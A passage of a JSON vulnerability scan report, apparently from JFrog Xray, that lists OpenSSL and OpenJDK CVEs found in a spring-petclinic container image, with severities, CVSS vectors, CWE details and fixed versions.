         "summary": "Issue summary: Checking excessively long DH keys or parameters may be very slow.\n\nImpact summary: Applications that use the functions DH_check(), DH_check_ex()\nor EVP_PKEY_param_check() to check a DH key or DH parameters may experience long\ndelays. Where the key or parameters that are being checked have been obtained\nfrom an untrusted source this may lead to a Denial of Service.\n\nThe function DH_check() performs various checks on DH parameters. After fixing\nCVE-2023-3446 it was discovered that a large q parameter value can also trigger\nan overly long computation during some of these checks. A correct q value,\nif present, cannot be larger than the modulus p parameter, thus it is\nunnecessary to perform these checks if q is larger than p.\n\nAn application that calls DH_check() and supplies a key or parameters obtained\nfrom an untrusted source could be vulnerable to a Denial of Service attack.\n\nThe function DH_check() is itself called by a number of other OpenSSL functions.\nAn application calling any of those other functions may similarly be affected.\nThe other functions affected by this are DH_check_ex() and\nEVP_PKEY_param_check().\n\nAlso vulnerable are the OpenSSL dhparam and pkeyparam command line applications\nwhen using the \"-check\" option.\n\nThe OpenSSL SSL/TLS implementation is not affected by this issue.\n\nThe OpenSSL 3.0 and 3.1 FIPS providers are not affected by this issue.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "3.14:libcrypto1.1",
         "source_id": "alpine://3.14:libcrypto1.1",
         "source_comp_id": "alpine://3.14:libcrypto1.1:1.1.1k-r0",
         "component_versions": {
            "id": "3.14:libcrypto1.1",
            "vulnerable_versions": [
               "< 3.1.2-r0"
            ],
            "fixed_versions": [
               "3.1.2-r0"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2023-3817",
                     "cwe": [
                        "CWE-834"
                     ],
                     "cwe_details": {
                        "CWE-834": {
                           "name": "Excessive Iteration",
                           "description": "The product performs an iteration or loop without sufficiently limiting the number of times that the loop is executed."
                        }
                     },
                     "cvss_v3": "5.3/CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L"
                  }
               ],
               "description": "Issue summary: Checking excessively long DH keys or parameters may be very slow.\n\nImpact summary: Applications that use the functions DH_check(), DH_check_ex()\nor EVP_PKEY_param_check() to check a DH key or DH parameters may experience long\ndelays. Where the key or parameters that are being checked have been obtained\nfrom an untrusted source this may lead to a Denial of Service.\n\nThe function DH_check() performs various checks on DH parameters. After fixing\nCVE-2023-3446 it was discovered that a large q parameter value can also trigger\nan overly long computation during some of these checks. A correct q value,\nif present, cannot be larger than the modulus p parameter, thus it is\nunnecessary to perform these checks if q is larger than p.\n\nAn application that calls DH_check() and supplies a key or parameters obtained\nfrom an untrusted source could be vulnerable to a Denial of Service attack.\n\nThe function DH_check() is itself called by a number of other OpenSSL functions.\nAn application calling any of those other functions may similarly be affected.\nThe other functions affected by this are DH_check_ex() and\nEVP_PKEY_param_check().\n\nAlso vulnerable are the OpenSSL dhparam and pkeyparam command line applications\nwhen using the \"-check\" option.\n\nThe OpenSSL SSL/TLS implementation is not affected by this issue.\n\nThe OpenSSL 3.0 and 3.1 FIPS providers are not affected by this issue.",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": false,
         "component_physical_paths": [
            ""
         ],
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:6",
            "source_comp_id": "",
            "vulnerability_id": "CVE-2023-3817",
            "result": "not_covered"
         }
      },
      {
         "id": "XRAY-526979",
         "severity": "Medium",
         "severity_source": "CVSS V3 from NVD",
         "pkg_type": "alpine",
         "summary": "Issue summary: Checking excessively long DH keys or parameters may be very slow.\n\nImpact summary: Applications that use the functions DH_check(), DH_check_ex()\nor EVP_PKEY_param_check() to check a DH key or DH parameters may experience long\ndelays. Where the key or parameters that are being checked have been obtained\nfrom an untrusted source this may lead to a Denial of Service.\n\nThe function DH_check() performs various checks on DH parameters. After fixing\nCVE-2023-3446 it was discovered that a large q parameter value can also trigger\nan overly long computation during some of these checks. A correct q value,\nif present, cannot be larger than the modulus p parameter, thus it is\nunnecessary to perform these checks if q is larger than p.\n\nAn application that calls DH_check() and supplies a key or parameters obtained\nfrom an untrusted source could be vulnerable to a Denial of Service attack.\n\nThe function DH_check() is itself called by a number of other OpenSSL functions.\nAn application calling any of those other functions may similarly be affected.\nThe other functions affected by this are DH_check_ex() and\nEVP_PKEY_param_check().\n\nAlso vulnerable are the OpenSSL dhparam and pkeyparam command line applications\nwhen using the \"-check\" option.\n\nThe OpenSSL SSL/TLS implementation is not affected by this issue.\n\nThe OpenSSL 3.0 and 3.1 FIPS providers are not affected by this issue.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "3.14:libssl1.1",
         "source_id": "alpine://3.14:libssl1.1",
         "source_comp_id": "alpine://3.14:libssl1.1:1.1.1k-r0",
         "component_versions": {
            "id": "3.14:libssl1.1",
            "vulnerable_versions": [
               "< 3.1.2-r0"
            ],
            "fixed_versions": [
               "3.1.2-r0"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2023-3817",
                     "cwe": [
                        "CWE-834"
                     ],
                     "cwe_details": {
                        "CWE-834": {
                           "name": "Excessive Iteration",
                           "description": "The product performs an iteration or loop without sufficiently limiting the number of times that the loop is executed."
                        }
                     },
                     "cvss_v3": "5.3/CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L"
                  }
               ],
               "description": "Issue summary: Checking excessively long DH keys or parameters may be very slow.\n\nImpact summary: Applications that use the functions DH_check(), DH_check_ex()\nor EVP_PKEY_param_check() to check a DH key or DH parameters may experience long\ndelays. Where the key or parameters that are being checked have been obtained\nfrom an untrusted source this may lead to a Denial of Service.\n\nThe function DH_check() performs various checks on DH parameters. After fixing\nCVE-2023-3446 it was discovered that a large q parameter value can also trigger\nan overly long computation during some of these checks. A correct q value,\nif present, cannot be larger than the modulus p parameter, thus it is\nunnecessary to perform these checks if q is larger than p.\n\nAn application that calls DH_check() and supplies a key or parameters obtained\nfrom an untrusted source could be vulnerable to a Denial of Service attack.\n\nThe function DH_check() is itself called by a number of other OpenSSL functions.\nAn application calling any of those other functions may similarly be affected.\nThe other functions affected by this are DH_check_ex() and\nEVP_PKEY_param_check().\n\nAlso vulnerable are the OpenSSL dhparam and pkeyparam command line applications\nwhen using the \"-check\" option.\n\nThe OpenSSL SSL/TLS implementation is not affected by this issue.\n\nThe OpenSSL 3.0 and 3.1 FIPS providers are not affected by this issue.",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": false,
         "component_physical_paths": [
            ""
         ],
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:6",
            "source_comp_id": "",
            "vulnerability_id": "CVE-2023-3817",
            "result": "not_covered"
         }
      },
      {
         "id": "XRAY-523321",
         "severity": "Medium",
         "severity_source": "CVSS V3 from NVD",
         "pkg_type": "alpine",
         "summary": "Issue summary: The AES-SIV cipher implementation contains a bug that causes\nit to ignore empty associated data entries which are unauthenticated as\na consequence.\n\nImpact summary: Applications that use the AES-SIV algorithm and want to\nauthenticate empty data entries as associated data can be misled by removing,\nadding or reordering such empty entries as these are ignored by the OpenSSL\nimplementation. We are currently unaware of any such applications.\n\nThe AES-SIV algorithm allows for authentication of multiple associated\ndata entries along with the encryption. To authenticate empty data the\napplication has to call EVP_EncryptUpdate() (or EVP_CipherUpdate()) with\nNULL pointer as the output buffer and 0 as the input buffer length.\nThe AES-SIV implementation in OpenSSL just returns success for such a call\ninstead of performing the associated data authentication operation.\nThe empty data thus will not be authenticated.\n\nAs this issue does not affect non-empty associated data authentication and\nwe expect it to be rare for an application to use empty associated data\nentries this is qualified as Low severity issue.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "3.14:libssl1.1",
         "source_id": "alpine://3.14:libssl1.1",
         "source_comp_id": "alpine://3.14:libssl1.1:1.1.1k-r0",
         "component_versions": {
            "id": "3.14:libssl1.1",
            "vulnerable_versions": [
               "< 3.1.1-r2"
            ],
            "fixed_versions": [
               "3.1.1-r2"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2023-2975",
                     "cwe": [
                        "CWE-287"
                     ],
                     "cwe_details": {
                        "CWE-287": {
                           "name": "Improper Authentication",
                           "description": "When an actor claims to have a given identity, the product does not prove or insufficiently proves that the claim is correct.",
                           "categories": [
                              {
                                 "category": "2023 CWE Top 25",
                                 "rank": "13"
                              }
                           ]
                        }
                     },
                     "cvss_v3": "5.3/CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N"
                  }
               ],
               "description": "Issue summary: The AES-SIV cipher implementation contains a bug that causes\nit to ignore empty associated data entries which are unauthenticated as\na consequence.\n\nImpact summary: Applications that use the AES-SIV algorithm and want to\nauthenticate empty data entries as associated data can be misled by removing,\nadding or reordering such empty entries as these are ignored by the OpenSSL\nimplementation. We are currently unaware of any such applications.\n\nThe AES-SIV algorithm allows for authentication of multiple associated\ndata entries along with the encryption. To authenticate empty data the\napplication has to call EVP_EncryptUpdate() (or EVP_CipherUpdate()) with\nNULL pointer as the output buffer and 0 as the input buffer length.\nThe AES-SIV implementation in OpenSSL just returns success for such a call\ninstead of performing the associated data authentication operation.\nThe empty data thus will not be authenticated.\n\nAs this issue does not affect non-empty associated data authentication and\nwe expect it to be rare for an application to use empty associated data\nentries this is qualified as Low severity issue.",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": false,
         "component_physical_paths": [
            ""
         ],
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:6",
            "source_comp_id": "",
            "vulnerability_id": "CVE-2023-2975",
            "result": "not_covered"
         }
      },
      {
         "id": "XRAY-523321",
         "severity": "Medium",
         "severity_source": "CVSS V3 from NVD",
         "pkg_type": "alpine",
         "summary": "Issue summary: The AES-SIV cipher implementation contains a bug that causes\nit to ignore empty associated data entries which are unauthenticated as\na consequence.\n\nImpact summary: Applications that use the AES-SIV algorithm and want to\nauthenticate empty data entries as associated data can be misled by removing,\nadding or reordering such empty entries as these are ignored by the OpenSSL\nimplementation. We are currently unaware of any such applications.\n\nThe AES-SIV algorithm allows for authentication of multiple associated\ndata entries along with the encryption. To authenticate empty data the\napplication has to call EVP_EncryptUpdate() (or EVP_CipherUpdate()) with\nNULL pointer as the output buffer and 0 as the input buffer length.\nThe AES-SIV implementation in OpenSSL just returns success for such a call\ninstead of performing the associated data authentication operation.\nThe empty data thus will not be authenticated.\n\nAs this issue does not affect non-empty associated data authentication and\nwe expect it to be rare for an application to use empty associated data\nentries this is qualified as Low severity issue.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "3.14:libcrypto1.1",
         "source_id": "alpine://3.14:libcrypto1.1",
         "source_comp_id": "alpine://3.14:libcrypto1.1:1.1.1k-r0",
         "component_versions": {
            "id": "3.14:libcrypto1.1",
            "vulnerable_versions": [
               "< 3.1.1-r2"
            ],
            "fixed_versions": [
               "3.1.1-r2"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2023-2975",
                     "cwe": [
                        "CWE-287"
                     ],
                     "cwe_details": {
                        "CWE-287": {
                           "name": "Improper Authentication",
                           "description": "When an actor claims to have a given identity, the product does not prove or insufficiently proves that the claim is correct.",
                           "categories": [
                              {
                                 "category": "2023 CWE Top 25",
                                 "rank": "13"
                              }
                           ]
                        }
                     },
                     "cvss_v3": "5.3/CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N"
                  }
               ],
               "description": "Issue summary: The AES-SIV cipher implementation contains a bug that causes\nit to ignore empty associated data entries which are unauthenticated as\na consequence.\n\nImpact summary: Applications that use the AES-SIV algorithm and want to\nauthenticate empty data entries as associated data can be misled by removing,\nadding or reordering such empty entries as these are ignored by the OpenSSL\nimplementation. We are currently unaware of any such applications.\n\nThe AES-SIV algorithm allows for authentication of multiple associated\ndata entries along with the encryption. To authenticate empty data the\napplication has to call EVP_EncryptUpdate() (or EVP_CipherUpdate()) with\nNULL pointer as the output buffer and 0 as the input buffer length.\nThe AES-SIV implementation in OpenSSL just returns success for such a call\ninstead of performing the associated data authentication operation.\nThe empty data thus will not be authenticated.\n\nAs this issue does not affect non-empty associated data authentication and\nwe expect it to be rare for an application to use empty associated data\nentries this is qualified as Low severity issue.",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": false,
         "component_physical_paths": [
            ""
         ],
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:6",
            "source_comp_id": "",
            "vulnerability_id": "CVE-2023-2975",
            "result": "not_covered"
         }
      },
      {
         "id": "XRAY-196807",
         "severity": "Medium",
         "severity_source": "CVSS V3 from NVD",
         "pkg_type": "alpine",
         "summary": "There is a carry propagation bug in the MIPS32 and MIPS64 squaring procedure. Many EC algorithms are affected, including some of the TLS 1.3 default curves. Impact was not analyzed in detail, because the pre-requisites for attack are considered unlikely and include reusing private keys. Analysis suggests that attacks against RSA and DSA as a result of this defect would be very difficult to perform and are not believed likely. Attacks against DH are considered just feasible (although very difficult) because most of the work necessary to deduce information about a private key may be performed offline. The amount of resources required for such an attack would be significant. However, for an attack on TLS to be meaningful, the server would have to share the DH private key among multiple clients, which is no longer an option since CVE-2016-0701. This issue affects OpenSSL versions 1.0.2, 1.1.1 and 3.0.0. It was addressed in the releases of 1.1.1m and 3.0.1 on the 15th of December 2021. For the 1.0.2 release it is addressed in git commit 6fc1aaaf3 that is available to premium support customers only. It will be made available in 1.0.2zc when it is released. The issue only affects OpenSSL on MIPS platforms. Fixed in OpenSSL 3.0.1 (Affected 3.0.0). Fixed in OpenSSL 1.1.1m (Affected 1.1.1-1.1.1l). Fixed in OpenSSL 1.0.2zc-dev (Affected 1.0.2-1.0.2zb).",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "3.14:libcrypto1.1",
         "source_id": "alpine://3.14:libcrypto1.1",
         "source_comp_id": "alpine://3.14:libcrypto1.1:1.1.1k-r0",
         "component_versions": {
            "id": "3.14:libcrypto1.1",
            "vulnerable_versions": [
               "1.0.2-r0 ≤ Version ≤ 1.0.2o-r1",
               "1.1.1-r0 ≤ Version < 1.1.1n-r0"
            ],
            "fixed_versions": [
               "1.1.1n-r0"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2021-4160",
                     "cwe": [
                        "NVD-CWE-noinfo"
                     ],
                     "cvss_v2": "4.3/CVSS:2.0/AV:N/AC:M/Au:N/C:P/I:N/A:N",
                     "cvss_v3": "5.9/CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N"
                  }
               ],
               "description": "There is a carry propagation bug in the MIPS32 and MIPS64 squaring procedure. Many EC algorithms are affected, including some of the TLS 1.3 default curves. Impact was not analyzed in detail, because the pre-requisites for attack are considered unlikely and include reusing private keys. Analysis suggests that attacks against RSA and DSA as a result of this defect would be very difficult to perform and are not believed likely. Attacks against DH are considered just feasible (although very difficult) because most of the work necessary to deduce information about a private key may be performed offline. The amount of resources required for such an attack would be significant. However, for an attack on TLS to be meaningful, the server would have to share the DH private key among multiple clients, which is no longer an option since CVE-2016-0701. This issue affects OpenSSL versions 1.0.2, 1.1.1 and 3.0.0. It was addressed in the releases of 1.1.1m and 3.0.1 on the 15th of December 2021. For the 1.0.2 release it is addressed in git commit 6fc1aaaf3 that is available to premium support customers only. It will be made available in 1.0.2zc when it is released. The issue only affects OpenSSL on MIPS platforms. Fixed in OpenSSL 3.0.1 (Affected 3.0.0). Fixed in OpenSSL 1.1.1m (Affected 1.1.1-1.1.1l). Fixed in OpenSSL 1.0.2zc-dev (Affected 1.0.2-1.0.2zb).",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": false,
         "component_physical_paths": [
            ""
         ],
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:6",
            "source_comp_id": "",
            "vulnerability_id": "CVE-2021-4160",
            "result": "not_covered"
         }
      },
      {
         "id": "XRAY-196807",
         "severity": "Medium",
         "severity_source": "CVSS V3 from NVD",
         "pkg_type": "alpine",
         "summary": "There is a carry propagation bug in the MIPS32 and MIPS64 squaring procedure. Many EC algorithms are affected, including some of the TLS 1.3 default curves. Impact was not analyzed in detail, because the pre-requisites for attack are considered unlikely and include reusing private keys. Analysis suggests that attacks against RSA and DSA as a result of this defect would be very difficult to perform and are not believed likely. Attacks against DH are considered just feasible (although very difficult) because most of the work necessary to deduce information about a private key may be performed offline. The amount of resources required for such an attack would be significant. However, for an attack on TLS to be meaningful, the server would have to share the DH private key among multiple clients, which is no longer an option since CVE-2016-0701. This issue affects OpenSSL versions 1.0.2, 1.1.1 and 3.0.0. It was addressed in the releases of 1.1.1m and 3.0.1 on the 15th of December 2021. For the 1.0.2 release it is addressed in git commit 6fc1aaaf3 that is available to premium support customers only. It will be made available in 1.0.2zc when it is released. The issue only affects OpenSSL on MIPS platforms. Fixed in OpenSSL 3.0.1 (Affected 3.0.0). Fixed in OpenSSL 1.1.1m (Affected 1.1.1-1.1.1l). Fixed in OpenSSL 1.0.2zc-dev (Affected 1.0.2-1.0.2zb).",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "3.14:libssl1.1",
         "source_id": "alpine://3.14:libssl1.1",
         "source_comp_id": "alpine://3.14:libssl1.1:1.1.1k-r0",
         "component_versions": {
            "id": "3.14:libssl1.1",
            "vulnerable_versions": [
               "1.0.2-r0 ≤ Version ≤ 1.0.2o-r1",
               "1.1.1-r0 ≤ Version < 1.1.1n-r0"
            ],
            "fixed_versions": [
               "1.1.1n-r0"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2021-4160",
                     "cwe": [
                        "NVD-CWE-noinfo"
                     ],
                     "cvss_v2": "4.3/CVSS:2.0/AV:N/AC:M/Au:N/C:P/I:N/A:N",
                     "cvss_v3": "5.9/CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N"
                  }
               ],
               "description": "There is a carry propagation bug in the MIPS32 and MIPS64 squaring procedure. Many EC algorithms are affected, including some of the TLS 1.3 default curves. Impact was not analyzed in detail, because the pre-requisites for attack are considered unlikely and include reusing private keys. Analysis suggests that attacks against RSA and DSA as a result of this defect would be very difficult to perform and are not believed likely. Attacks against DH are considered just feasible (although very difficult) because most of the work necessary to deduce information about a private key may be performed offline. The amount of resources required for such an attack would be significant. However, for an attack on TLS to be meaningful, the server would have to share the DH private key among multiple clients, which is no longer an option since CVE-2016-0701. This issue affects OpenSSL versions 1.0.2, 1.1.1 and 3.0.0. It was addressed in the releases of 1.1.1m and 3.0.1 on the 15th of December 2021. For the 1.0.2 release it is addressed in git commit 6fc1aaaf3 that is available to premium support customers only. It will be made available in 1.0.2zc when it is released. The issue only affects OpenSSL on MIPS platforms. Fixed in OpenSSL 3.0.1 (Affected 3.0.0). Fixed in OpenSSL 1.1.1m (Affected 1.1.1-1.1.1l). Fixed in OpenSSL 1.0.2zc-dev (Affected 1.0.2-1.0.2zb).",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": false,
         "component_physical_paths": [
            ""
         ],
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:6",
            "source_comp_id": "",
            "vulnerability_id": "CVE-2021-4160",
            "result": "not_covered"
         }
      },
      {
         "id": "XRAY-196394",
         "severity": "Medium",
         "severity_source": "CVSS V3 from NVD",
         "pkg_type": "cpp",
         "summary": "Vulnerability in the Oracle Java SE, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: Libraries). Supported versions that are affected are Oracle Java SE: 7u321, 8u311, 11.0.13, 17.0.1; Oracle GraalVM Enterprise Edition: 20.3.4 and 21.3.0. Easily exploitable vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Oracle Java SE, Oracle GraalVM Enterprise Edition. Successful attacks of this vulnerability can result in unauthorized ability to cause a partial denial of service (partial DOS) of Oracle Java SE, Oracle GraalVM Enterprise Edition. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability can also be exploited by using APIs in the specified Component, e.g., through a web service which supplies data to the APIs. CVSS 3.1 Base Score 5.3 (Availability impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L).",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "oracle:openjdk",
         "source_id": "cpp://oracle:openjdk",
         "source_comp_id": "cpp://oracle:openjdk:17",
         "component_versions": {
            "id": "oracle:openjdk",
            "vulnerable_versions": [
               "< 7.331",
               "11.0.0 ≤ Version < 11.0.14",
               "17.0.0 ≤ Version < 17.0.2",
               "8.0.0 ≤ Version < 8.321"
            ],
            "fixed_versions": [
               "11.0.14",
               "17.0.2",
               "7.331",
               "8.321"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2022-21293",
                     "cwe": [
                        "NVD-CWE-noinfo"
                     ],
                     "cvss_v2": "5.0/CVSS:2.0/AV:N/AC:L/Au:N/C:N/I:N/A:P",
                     "cvss_v3": "5.3/CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L"
                  }
               ],
               "description": "Vulnerability in the Oracle Java SE, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: Libraries). Supported versions that are affected are Oracle Java SE: 7u321, 8u311, 11.0.13, 17.0.1; Oracle GraalVM Enterprise Edition: 20.3.4 and 21.3.0. Easily exploitable vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Oracle Java SE, Oracle GraalVM Enterprise Edition. Successful attacks of this vulnerability can result in unauthorized ability to cause a partial denial of service (partial DOS) of Oracle Java SE, Oracle GraalVM Enterprise Edition. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability can also be exploited by using APIs in the specified Component, e.g., through a web service which supplies data to the APIs. CVSS 3.1 Base Score 5.3 (Availability impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L).",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": false,
         "component_physical_paths": [
            "sha256__d8d715783b80cab158f5bf9726bcada5265c1624b64ca2bb46f42f94998d4662.tar.gz/opt/openjdk-17/lib/libjavajpeg.so",
            "sha256__d8d715783b80cab158f5bf9726bcada5265c1624b64ca2bb46f42f94998d4662.tar.gz/opt/openjdk-17/bin/javap",
            "sha256__d8d715783b80cab158f5bf9726bcada5265c1624b64ca2bb46f42f94998d4662.tar.gz/opt/openjdk-17/bin/java",
            "sha256__d8d715783b80cab158f5bf9726bcada5265c1624b64ca2bb46f42f94998d4662.tar.gz/opt/openjdk-17/bin/javac",
            "sha256__d8d715783b80cab158f5bf9726bcada5265c1624b64ca2bb46f42f94998d4662.tar.gz/opt/openjdk-17/lib/libjava.so",
            "sha256__d8d715783b80cab158f5bf9726bcada5265c1624b64ca2bb46f42f94998d4662.tar.gz/opt/openjdk-17/bin/javadoc"
         ],
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:6",
            "source_comp_id": "",
            "vulnerability_id": "CVE-2022-21293",
            "result": "not_covered"
         }
      },
      {
         "id": "XRAY-196393",
         "severity": "Medium",
         "severity_source": "CVSS V3 from NVD",
         "pkg_type": "cpp",
         "summary": "Vulnerability in the Oracle Java SE, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: Libraries). Supported versions that are affected are Oracle Java SE: 7u321, 8u311, 11.0.13, 17.0.1; Oracle GraalVM Enterprise Edition: 20.3.4 and 21.3.0. Easily exploitable vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Oracle Java SE, Oracle GraalVM Enterprise Edition. Successful attacks of this vulnerability can result in unauthorized ability to cause a partial denial of service (partial DOS) of Oracle Java SE, Oracle GraalVM Enterprise Edition. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability can also be exploited by using APIs in the specified Component, e.g., through a web service which supplies data to the APIs. CVSS 3.1 Base Score 5.3 (Availability impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L).",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "oracle:openjdk",
         "source_id": "cpp://oracle:openjdk",
         "source_comp_id": "cpp://oracle:openjdk:17",
         "component_versions": {
            "id": "oracle:openjdk",
            "vulnerable_versions": [
               "< 7.331",
               "11.0.0 ≤ Version < 11.0.14",
               "17.0.0 ≤ Version < 17.0.2",
               "8.0.0 ≤ Version < 8.321"
            ],
            "fixed_versions": [
               "11.0.14",
               "17.0.2",
               "7.331",
               "8.321"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2022-21294",
                     "cwe": [
                        "NVD-CWE-noinfo"
                     ],
                     "cvss_v2": "5.0/CVSS:2.0/AV:N/AC:L/Au:N/C:N/I:N/A:P",
                     "cvss_v3": "5.3/CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L"
                  }
               ],
               "description": "Vulnerability in the Oracle Java SE, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: Libraries). Supported versions that are affected are Oracle Java SE: 7u321, 8u311, 11.0.13, 17.0.1; Oracle GraalVM Enterprise Edition: 20.3.4 and 21.3.0. Easily exploitable vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Oracle Java SE, Oracle GraalVM Enterprise Edition. Successful attacks of this vulnerability can result in unauthorized ability to cause a partial denial of service (partial DOS) of Oracle Java SE, Oracle GraalVM Enterprise Edition. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability can also be exploited by using APIs in the specified Component, e.g., through a web service which supplies data to the APIs. CVSS 3.1 Base Score 5.3 (Availability impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L).",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": false,
         "component_physical_paths": [
            "sha256__d8d715783b80cab158f5bf9726bcada5265c1624b64ca2bb46f42f94998d4662.tar.gz/opt/openjdk-17/lib/libjavajpeg.so",
            "sha256__d8d715783b80cab158f5bf9726bcada5265c1624b64ca2bb46f42f94998d4662.tar.gz/opt/openjdk-17/lib/libjava.so",
            "sha256__d8d715783b80cab158f5bf9726bcada5265c1624b64ca2bb46f42f94998d4662.tar.gz/opt/openjdk-17/bin/javap",
            "sha256__d8d715783b80cab158f5bf9726bcada5265c1624b64ca2bb46f42f94998d4662.tar.gz/opt/openjdk-17/bin/javadoc",
            "sha256__d8d715783b80cab158f5bf9726bcada5265c1624b64ca2bb46f42f94998d4662.tar.gz/opt/openjdk-17/bin/javac",
            "sha256__d8d715783b80cab158f5bf9726bcada5265c1624b64ca2bb46f42f94998d4662.tar.gz/opt/openjdk-17/bin/java"
         ],
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:6",
            "source_comp_id": "",
            "vulnerability_id": "CVE-2022-21294",
            "result": "not_covered"
         }
      },
      {
         "id": "XRAY-196389",
         "severity": "Medium",
         "severity_source": "CVSS V3 from NVD",
         "pkg_type": "cpp",
         "summary": "Vulnerability in the Oracle Java SE, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: Libraries). Supported versions that are affected are Oracle Java SE: 7u321, 8u311, 11.0.13, 17.0.1; Oracle GraalVM Enterprise Edition: 20.3.4 and 21.3.0. Easily exploitable vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Oracle Java SE, Oracle GraalVM Enterprise Edition. Successful attacks of this vulnerability can result in unauthorized ability to cause a partial denial of service (partial DOS) of Oracle Java SE, Oracle GraalVM Enterprise Edition. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability can also be exploited by using APIs in the specified Component, e.g., through a web service which supplies data to the APIs. CVSS 3.1 Base Score 5.3 (Availability impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L).",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "oracle:openjdk",
         "source_id": "cpp://oracle:openjdk",
         "source_comp_id": "cpp://oracle:openjdk:17",
         "component_versions": {
            "id": "oracle:openjdk",
            "vulnerable_versions": [
               "11.0.0 ≤ Version < 11.0.14",
               "17.0.0 ≤ Version < 17.0.2",
               "7.0.0 ≤ Version < 7.331",
               "8.0.0 ≤ Version < 8.321"
            ],
            "fixed_versions": [
               "11.0.14",
               "17.0.2",
               "7.331",
               "8.321"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2022-21340",
                     "cwe": [
                        "NVD-CWE-noinfo"
                     ],
                     "cvss_v2": "5.0/CVSS:2.0/AV:N/AC:L/Au:N/C:N/I:N/A:P",
                     "cvss_v3": "5.3/CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L"
                  }
               ],
